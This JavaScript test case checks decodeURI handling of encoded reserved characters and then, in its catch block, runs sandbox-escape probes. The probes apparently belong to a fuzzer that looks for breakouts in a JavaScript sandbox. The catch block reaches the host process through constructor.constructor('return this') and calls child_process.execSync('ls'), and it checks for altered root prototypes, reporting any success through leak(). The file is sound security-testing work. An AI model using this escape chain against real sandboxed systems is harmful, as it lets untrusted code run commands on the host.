try {
    if (decodeURI('%3B%2F%3F%3A%40%26%3D%2B%24%2C%23') !== '%3B%2F%3F%3A%40%26%3D%2B%24%2C%23') {
        $ERROR('#1: decodeURI("%3B%2F%3F%3A%40%26%3D%2B%24%2C%23") equal "%3B%2F%3F%3A%40%26%3D%2B%24%2C%23", not ";/?:@&=+$,#"');
    }
    if (decodeURI('%3b%2f%3f%3a%40%26%3d%2b%24%2c%23') !== '%3b%2f%3f%3a%40%26%3d%2b%24%2c%23') {
        $ERROR('#2: decodeURI("%3b%2f%3f%3a%40%26%3d%2b%24%2c%23") equal "%3b%2f%3f%3a%40%26%3d%2b%24%2c%23", not ";/?:@&=+$,#" or "%3B%2F%3F%3A%40%26%3D%2B%24%2C%23"');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}